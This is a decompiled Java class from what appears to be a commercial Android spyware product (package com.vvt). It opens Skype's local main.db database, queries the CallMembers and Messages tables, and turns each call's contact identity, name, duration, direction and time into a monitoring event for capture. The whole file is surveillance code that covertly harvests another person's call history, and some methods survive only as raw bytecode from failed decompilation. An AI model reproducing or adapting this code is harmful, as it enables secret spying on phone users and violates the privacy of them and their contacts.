package com.vvt.capture.e.c.a;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.vvt.base.FxEvent;
import com.vvt.capture.e.d;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxVoipCallLogEvent;
import com.vvt.events.FxVoipCallLogEvent.FxIsMonitor;
import com.vvt.events.FxVoipCategory;
import com.vvt.im.events.info.ICallLogData.Direction;
import com.vvt.im.events.info.ICallLogData.IsMonitor;
import com.vvt.p.c;
import java.util.ArrayList;

public class b
{
  private static final boolean a;
  private static final boolean b;
  
  static
  {
    boolean bool = com.vvt.ak.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = com.vvt.ak.a.e;
      return;
    }
  }
  
  private static int a(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    int i = 0;
    Object localObject1 = null;
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    bool1 = false;
    localCursor = null;
    try
    {
      String str = d();
      boolean bool2 = a;
      if (bool2) {}
      bool2 = true;
      String[] arrayOfString = new String[bool2];
      arrayOfString[0] = paramString;
      localCursor = paramSQLiteDatabase.rawQuery(str, arrayOfString);
      if (localCursor != null)
      {
        boolean bool3 = localCursor.moveToFirst();
        if (bool3)
        {
          str = "param_value";
          int j = localCursor.getColumnIndex(str);
          i = localCursor.getInt(j);
        }
      }
      if (localCursor == null) {
        break label126;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool4 = b;
        if ((bool4) && (localCursor == null)) {}
      }
    }
    finally
    {
      if (localCursor == null) {
        break label181;
      }
      localCursor.close();
    }
    localCursor.close();
    label126:
    bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    return i;
  }
  
  /* Error */
  private static long a(SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_1
    //   3: ldc 54
    //   5: astore_3
    //   6: ldc 56
    //   8: astore 4
    //   10: aconst_null
    //   11: astore 5
    //   13: iconst_0
    //   14: istore 6
    //   16: aconst_null
    //   17: astore 7
    //   19: iconst_0
    //   20: istore 8
    //   22: aconst_null
    //   23: astore 9
    //   25: ldc 58
    //   27: astore 10
    //   29: aload_0
    //   30: astore 11
    //   32: aload_0
    //   33: aload 4
    //   35: aconst_null
    //   36: aconst_null
    //   37: aconst_null
    //   38: aconst_null
    //   39: aconst_null
    //   40: aload_3
    //   41: aload 10
    //   43: invokevirtual 62	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   46: astore 5
    //   48: aload 5
    //   50: ifnull +188 -> 238
    //   53: aload 5
    //   55: invokeinterface 65 1 0
    //   60: istore 12
    //   62: iload 12
    //   64: ifeq +174 -> 238
    //   67: lload_1
    //   68: lstore 13
    //   70: ldc 67
    //   72: astore 7
    //   74: aload 5
    //   76: aload 7
    //   78: invokeinterface 42 2 0
    //   83: istore 6
    //   85: aload 5
    //   87: iload 6
    //   89: invokeinterface 46 2 0
    //   94: istore 6
    //   96: ldc 69
    //   98: astore 9
    //   100: aload 5
    //   102: aload 9
    //   104: invokeinterface 42 2 0
    //   109: istore 8
    //   111: aload 5
    //   113: iload 8
    //   115: invokeinterface 73 2 0
    //   120: lstore 13
    //   122: iload 6
    //   124: ifne +33 -> 157
    //   127: bipush -2
    //   129: i2l
    //   130: lstore 13
    //   132: getstatic 13	com/vvt/capture/e/MyUncaughtExceptionHandler/a/removeFromPath:a	Z
    //   135: istore 6
    //   137: iload 6
    //   139: ifeq +3 -> 142
    //   142: aload 5
    //   144: ifnull +10 -> 154
    //   147: aload 5
    //   149: invokeinterface 50 1 0
    //   154: lload 13
    //   156: lreturn
    //   157: aload 5
    //   159: invokeinterface 76 1 0
    //   164: istore 6
    //   166: iload 6
    //   168: ifne -98 -> 70
    //   171: goto -39 -> 132
    //   174: astore 11
    //   176: aconst_null
    //   177: astore 5
    //   179: lload_1
    //   180: lstore 13
    //   182: getstatic 18	com/vvt/capture/e/MyUncaughtExceptionHandler/a/removeFromPath:removeFromPath	Z
    //   185: istore 6
    //   187: iload 6
    //   189: ifeq +3 -> 192
    //   192: aload 5
    //   194: ifnull -40 -> 154
    //   197: goto -50 -> 147
    //   200: astore 11
    //   202: aconst_null
    //   203: astore 5
    //   205: aload 5
    //   207: ifnull +10 -> 217
    //   210: aload 5
    //   212: invokeinterface 50 1 0
    //   217: aload 11
    //   219: athrow
    //   220: astore 11
    //   222: goto -17 -> 205
    //   225: astore 11
    //   227: lload_1
    //   228: lstore 13
    //   230: goto -48 -> 182
    //   233: astore 7
    //   235: goto -53 -> 182
    //   238: lload_1
    //   239: lstore 13
    //   241: goto -109 -> 132
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	244	0	paramSQLiteDatabase	SQLiteDatabase
    //   2	237	1	l1	long
    //   5	36	3	str1	String
    //   8	26	4	str2	String
    //   11	200	5	localCursor	Cursor
    //   14	109	6	i	int
    //   135	53	6	bool1	boolean
    //   17	60	7	str3	String
    //   233	1	7	localException1	Exception
    //   20	94	8	j	int
    //   23	80	9	str4	String
    //   27	15	10	str5	String
    //   30	1	11	localSQLiteDatabase	SQLiteDatabase
    //   174	1	11	localException2	Exception
    //   200	18	11	localObject1	Object
    //   220	1	11	localObject2	Object
    //   225	1	11	localException3	Exception
    //   60	3	12	bool2	boolean
    //   68	172	13	l2	long
    // Exception table:
    //   from	to	target	type
    //   41	46	174	java/lang/Exception
    //   41	46	200	finally
    //   53	60	220	finally
    //   76	83	220	finally
    //   87	94	220	finally
    //   102	109	220	finally
    //   113	120	220	finally
    //   132	135	220	finally
    //   157	164	220	finally
    //   182	185	220	finally
    //   53	60	225	java/lang/Exception
    //   76	83	233	java/lang/Exception
    //   87	94	233	java/lang/Exception
    //   102	109	233	java/lang/Exception
    //   113	120	233	java/lang/Exception
    //   132	135	233	java/lang/Exception
    //   157	164	233	java/lang/Exception
  }
  
  static FxEvent a(com.vvt.capture.e.a.a parama)
  {
    FxVoipCallLogEvent localFxVoipCallLogEvent = new com/vvt/events/FxVoipCallLogEvent;
    localFxVoipCallLogEvent.<init>();
    long l = parama.h();
    localFxVoipCallLogEvent.setEventTime(l);
    Object localObject1 = FxVoipCategory.SKYPE;
    localFxVoipCallLogEvent.setVoipCategory((FxVoipCategory)localObject1);
    localObject1 = FxEventDirection.MISSED_CALL;
    Object localObject2 = parama.i();
    ICallLogData.Direction localDirection = ICallLogData.Direction.IN;
    if (localObject2 == localDirection)
    {
      localObject1 = FxEventDirection.IN;
      localFxVoipCallLogEvent.setDirection((FxEventDirection)localObject1);
      l = parama.a();
      localFxVoipCallLogEvent.setDuration(l);
      localObject1 = parama.b();
      localFxVoipCallLogEvent.setUserId((String)localObject1);
      localObject1 = parama.c();
      localFxVoipCallLogEvent.setContactName((String)localObject1);
      int i = parama.d();
      l = i;
      localFxVoipCallLogEvent.setTransferredBytes(l);
      localObject1 = parama.e();
      localObject2 = ICallLogData.IsMonitor.YES;
      if (localObject1 != localObject2) {
        break label180;
      }
    }
    label180:
    for (localObject1 = FxVoipCallLogEvent.FxIsMonitor.YES;; localObject1 = FxVoipCallLogEvent.FxIsMonitor.NO)
    {
      localFxVoipCallLogEvent.setIsMonitor((FxVoipCallLogEvent.FxIsMonitor)localObject1);
      l = parama.f();
      localFxVoipCallLogEvent.setFrameStripId(l);
      return localFxVoipCallLogEvent;
      localObject2 = parama.i();
      localDirection = ICallLogData.Direction.OUT;
      if (localObject2 != localDirection) {
        break;
      }
      localObject1 = FxEventDirection.OUT;
      break;
    }
  }
  
  private static ICallLogData.Direction a(int paramInt1, int paramInt2)
  {
    ICallLogData.Direction localDirection = ICallLogData.Direction.MISSED_CALL;
    switch (paramInt1)
    {
    }
    for (;;)
    {
      return localDirection;
      if (paramInt2 > 0)
      {
        localDirection = ICallLogData.Direction.IN;
        continue;
        localDirection = ICallLogData.Direction.OUT;
      }
    }
  }
  
  public static String a()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT ");
    localStringBuilder.append("id, identity, dispname, call_duration, type, creation_timestamp, call_name ");
    localStringBuilder.append("FROM CallMembers ");
    localStringBuilder.append("ORDER BY id DESC LIMIT ?");
    return localStringBuilder.toString();
  }
  
  public static String a(String paramString)
  {
    synchronized (b.class)
    {
      String str = d.c(paramString);
      return str;
    }
  }
  
  public static ArrayList a(int paramInt)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    localSQLiteDatabase = null;
    for (;;)
    {
      try
      {
        String str1 = b();
        if (str1 != null)
        {
          String str2 = "main.db";
          localSQLiteDatabase = com.vvt.capture.e.b.a.a.a(str2, str1);
          if (localSQLiteDatabase == null) {
            continue;
          }
          localArrayList = a(localSQLiteDatabase, paramInt);
        }
        if (localSQLiteDatabase == null) {
          continue;
        }
      }
      catch (Exception localException)
      {
        boolean bool = b;
        if ((bool) && (localSQLiteDatabase == null)) {
          continue;
        }
        continue;
      }
      finally
      {
        if (localSQLiteDatabase == null) {
          continue;
        }
        localSQLiteDatabase.close();
      }
      localSQLiteDatabase.close();
      return localArrayList;
      bool = b;
      if (!bool) {}
    }
  }
  
  public static ArrayList a(long paramLong1, long paramLong2)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    localSQLiteDatabase = null;
    try
    {
      String str1 = b();
      if (str1 != null)
      {
        String str2 = "main.db";
        localSQLiteDatabase = com.vvt.capture.e.b.a.a.a(str2, str1);
        localArrayList = a(localSQLiteDatabase, paramLong1, paramLong2);
      }
      if (localSQLiteDatabase == null) {
        break label55;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = b;
        if ((bool) && (localSQLiteDatabase == null)) {}
      }
    }
    finally
    {
      if (localSQLiteDatabase == null) {
        break label90;
      }
      localSQLiteDatabase.close();
    }
    localSQLiteDatabase.close();
    label55:
    return localArrayList;
  }
  
  public static ArrayList a(SQLiteDatabase paramSQLiteDatabase, int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool2 = false;
    localCursor = null;
    try
    {
      String str1 = a();
      boolean bool3 = a;
      if (bool3) {}
      int i = -1;
      if (paramInt == i) {
        paramInt = -1 >>> 1;
      }
      i = 1;
      String[] arrayOfString = new String[i];
      String str2 = Integer.toString(paramInt);
      arrayOfString[0] = str2;
      localCursor = paramSQLiteDatabase.rawQuery(str1, arrayOfString);
      if (localCursor != null) {
        localArrayList = a(paramSQLiteDatabase, localCursor);
      }
      if (localCursor == null) {
        break label106;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool4 = b;
        if ((bool4) && (localCursor == null)) {}
      }
    }
    finally
    {
      if (localCursor == null) {
        break label151;
      }
      localCursor.close();
    }
    localCursor.close();
    label106:
    bool2 = a;
    if (bool2) {}
    return localArrayList;
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, long paramLong1, long paramLong2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool2 = false;
    localCursor = null;
    try
    {
      String str1 = c();
      boolean bool3 = a;
      if (bool3) {}
      int i = 2;
      String[] arrayOfString = new String[i];
      int j = 0;
      Object localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject2 = ((StringBuilder)localObject2).append(paramLong1);
      String str2 = "";
      localObject2 = ((StringBuilder)localObject2).append(str2);
      localObject2 = ((StringBuilder)localObject2).toString();
      arrayOfString[0] = localObject2;
      j = 1;
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject2 = ((StringBuilder)localObject2).append(paramLong2);
      str2 = "";
      localObject2 = ((StringBuilder)localObject2).append(str2);
      localObject2 = ((StringBuilder)localObject2).toString();
      arrayOfString[j] = localObject2;
      localCursor = paramSQLiteDatabase.rawQuery(str1, arrayOfString);
      if (localCursor != null) {
        localArrayList = a(paramSQLiteDatabase, localCursor);
      }
      if (localCursor == null) {
        break label181;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool4 = b;
        if ((bool4) && (localCursor == null)) {}
      }
    }
    finally
    {
      if (localCursor == null) {
        break label228;
      }
      localCursor.close();
    }
    localCursor.close();
    label181:
    bool2 = a;
    if (bool2) {}
    return localArrayList;
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, Cursor paramCursor)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramCursor.moveToLast();
    boolean bool2;
    if (bool1)
    {
      bool1 = a;
      if (bool1) {}
      int i = paramCursor.getColumnIndex("creation_timestamp");
      long l1 = paramCursor.getLong(i);
      long l2 = 1000L;
      l1 *= l2;
      i = paramCursor.getColumnIndex("identity");
      String str1 = paramCursor.getString(i);
      i = paramCursor.getColumnIndex("dispname");
      String str2 = paramCursor.getString(i);
      Object localObject1 = "call_duration";
      i = paramCursor.getColumnIndex((String)localObject1);
      i = paramCursor.getInt(i);
      String str3 = "type";
      int j = paramCursor.getColumnIndex(str3);
      j = paramCursor.getInt(j);
      int k = paramCursor.getColumnIndex("call_name");
      Object localObject2 = paramCursor.getString(k);
      boolean bool3 = com.vvt.ag.b.a(str1);
      if (bool3) {
        break label315;
      }
      if (i == 0) {
        i = a(paramSQLiteDatabase, (String)localObject2);
      }
      localObject2 = new com/vvt/capture/e/a/a;
      ((com.vvt.capture.e.a.a)localObject2).<init>();
      ((com.vvt.capture.e.a.a)localObject2).b(l1);
      ICallLogData.Direction localDirection = a(j, i);
      ((com.vvt.capture.e.a.a)localObject2).a(localDirection);
      l1 = i;
      ((com.vvt.capture.e.a.a)localObject2).a(l1);
      ((com.vvt.capture.e.a.a)localObject2).a(str1);
      ((com.vvt.capture.e.a.a)localObject2).b(str2);
      ((com.vvt.capture.e.a.a)localObject2).a(0);
      localObject1 = ICallLogData.IsMonitor.NO;
      ((com.vvt.capture.e.a.a)localObject2).a((ICallLogData.IsMonitor)localObject1);
      ((com.vvt.capture.e.a.a)localObject2).b(0);
      localArrayList.add(localObject2);
      bool2 = a;
      if (!bool2) {}
    }
    for (;;)
    {
      bool2 = paramCursor.moveToPrevious();
      if (bool2) {
        break;
      }
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      return localArrayList;
      label315:
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  public static ArrayList a(String paramString1, String paramString2, int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      String str = d.c(paramString2);
      if (str != null)
      {
        int i = 17;
        localSQLiteDatabase = c.a(i, paramString1);
      }
      if (localSQLiteDatabase != null) {
        localArrayList = a(localSQLiteDatabase, paramInt);
      }
      return localArrayList;
    }
    finally
    {
      if (localSQLiteDatabase != null) {
        localSQLiteDatabase.close();
      }
    }
  }
  
  public static ArrayList a(String paramString1, String paramString2, long paramLong1, long paramLong2)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      String str = d.c(paramString2);
      if (str != null)
      {
        int i = 17;
        localSQLiteDatabase = c.a(i, paramString1);
      }
      if (localSQLiteDatabase != null) {
        localArrayList = a(localSQLiteDatabase, paramLong1, paramLong2);
      }
      return localArrayList;
    }
    finally
    {
      if (localSQLiteDatabase != null) {
        localSQLiteDatabase.close();
      }
    }
  }
  
  /* Error */
  public static long b(String paramString)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_1
    //   3: aconst_null
    //   4: astore_3
    //   5: ldc -47
    //   7: astore 4
    //   9: aload 4
    //   11: aload_0
    //   12: invokestatic 214	com/vvt/capture/e/removeFromPath/a/a:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   15: astore 5
    //   17: aload 5
    //   19: ifnull +94 -> 113
    //   22: aload 5
    //   24: invokestatic 303	com/vvt/capture/e/MyUncaughtExceptionHandler/a/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;)J
    //   27: lstore 6
    //   29: getstatic 13	com/vvt/capture/e/MyUncaughtExceptionHandler/a/removeFromPath:a	Z
    //   32: istore 8
    //   34: iload 8
    //   36: ifeq +3 -> 39
    //   39: aload 5
    //   41: ifnull +8 -> 49
    //   44: aload 5
    //   46: invokevirtual 218	android/database/sqlite/SQLiteDatabase:close	()V
    //   49: lload 6
    //   51: lreturn
    //   52: astore 4
    //   54: aconst_null
    //   55: astore 5
    //   57: lload_1
    //   58: lstore 6
    //   60: getstatic 18	com/vvt/capture/e/MyUncaughtExceptionHandler/a/removeFromPath:removeFromPath	Z
    //   63: istore 8
    //   65: iload 8
    //   67: ifeq +3 -> 70
    //   70: aload 5
    //   72: ifnull -23 -> 49
    //   75: goto -31 -> 44
    //   78: astore 4
    //   80: aconst_null
    //   81: astore 5
    //   83: aload 4
    //   85: astore_3
    //   86: aload 5
    //   88: ifnull +8 -> 96
    //   91: aload 5
    //   93: invokevirtual 218	android/database/sqlite/SQLiteDatabase:close	()V
    //   96: aload_3
    //   97: athrow
    //   98: astore_3
    //   99: goto -13 -> 86
    //   102: astore_3
    //   103: lload_1
    //   104: lstore 6
    //   106: goto -46 -> 60
    //   109: pop
    //   110: goto -50 -> 60
    //   113: lload_1
    //   114: lstore 6
    //   116: goto -87 -> 29
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	119	0	paramString	String
    //   2	112	1	l1	long
    //   4	93	3	localObject1	Object
    //   98	1	3	localObject2	Object
    //   102	1	3	localException1	Exception
    //   7	3	4	str	String
    //   52	1	4	localException2	Exception
    //   78	6	4	localObject3	Object
    //   15	77	5	localSQLiteDatabase	SQLiteDatabase
    //   27	88	6	l2	long
    //   32	34	8	bool	boolean
    //   109	1	11	localException3	Exception
    // Exception table:
    //   from	to	target	type
    //   11	15	52	java/lang/Exception
    //   11	15	78	finally
    //   22	27	98	finally
    //   29	32	98	finally
    //   60	63	98	finally
    //   22	27	102	java/lang/Exception
    //   29	32	109	java/lang/Exception
  }
  
  public static String b()
  {
    synchronized (b.class)
    {
      String str = d.b();
      return str;
    }
  }
  
  public static long c(String paramString)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    long l = -1;
    int i = 17;
    try
    {
      localSQLiteDatabase = c.a(i, paramString);
      if (localSQLiteDatabase != null) {
        l = a(localSQLiteDatabase);
      }
      return l;
    }
    finally
    {
      if (localSQLiteDatabase != null) {
        localSQLiteDatabase.close();
      }
    }
  }
  
  private static String c()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT ");
    localStringBuilder.append("id, identity, dispname, call_duration, type, creation_timestamp, call_name ");
    localStringBuilder.append("FROM CallMembers ");
    localStringBuilder.append("WHERE id > ? ");
    localStringBuilder.append("AND id <= ? ");
    localStringBuilder.append("ORDER BY id DESC ");
    return localStringBuilder.toString();
  }
  
  private static String d()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT ");
    localStringBuilder.append("param_value ");
    localStringBuilder.append("FROM Messages ");
    localStringBuilder.append("WHERE call_guid = ?");
    return localStringBuilder.toString();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/e/MyUncaughtExceptionHandler/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */